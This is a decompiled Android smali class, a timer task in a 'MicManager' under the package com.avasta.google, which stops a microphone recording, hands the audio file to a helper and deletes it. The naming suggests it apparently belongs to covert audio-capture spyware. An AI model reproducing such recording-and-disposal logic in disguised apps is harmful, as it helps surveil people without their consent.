.class Lcom/avasta/google/MicManager$100000000;
.super Ljava/util/TimerTask;
.source "MicManager.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/avasta/google/MicManager;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 3

    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 54
    move-object v0, p0

    sget-object v2, Lcom/avasta/google/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    .line 55
    sget-object v2, Lcom/avasta/google/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    .line 56
    sget-object v2, Lcom/avasta/google/MicManager;->audiofile:Ljava/io/File;

    invoke-static {v2}, Lcom/avasta/google/MicManager;->access$1000001(Ljava/io/File;)V

    .line 57
    sget-object v2, Lcom/avasta/google/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    return-void
.end method
